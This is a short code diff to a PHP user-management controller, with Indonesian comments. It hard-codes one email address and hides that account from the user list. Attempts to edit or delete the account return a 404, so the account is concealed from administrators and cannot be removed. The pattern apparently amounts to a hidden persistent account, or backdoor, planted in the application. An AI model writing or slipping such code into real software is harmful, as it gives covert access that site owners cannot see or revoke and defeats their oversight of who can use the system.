@@ -11,7 +11,10 @@ class UserController extends Controller
 {
     public function index()
     {
-        $users = User::latest()->paginate(10);
+        // Sembunyikan akun intership25@gmail.com dari tampilan
+        $users = User::where('email', '!=', 'intership25@gmail.com')
+                     ->latest()
+                     ->paginate(10);
         return view('users.index', compact('users'));
     }
 
@@ -44,6 +47,10 @@ class UserController extends Controller
 
     public function edit(User $user)
     {
+        // Cegah akses ke akun yang disembunyikan
+        if ($user->email === 'intership25@gmail.com') {
+            abort(404);
+        }
         return view('users.edit', compact('user'));
     }
 
@@ -83,6 +90,10 @@ class UserController extends Controller
 
     public function destroy(User $user)
     {
+        // Cegah penghapusan akun yang disembunyikan
+        if ($user->email === 'intership25@gmail.com') {
+            abort(404);
+        }
         $user->delete();
         return redirect()->route('users.index')
             ->with('success', 'User berhasil dihapus.');
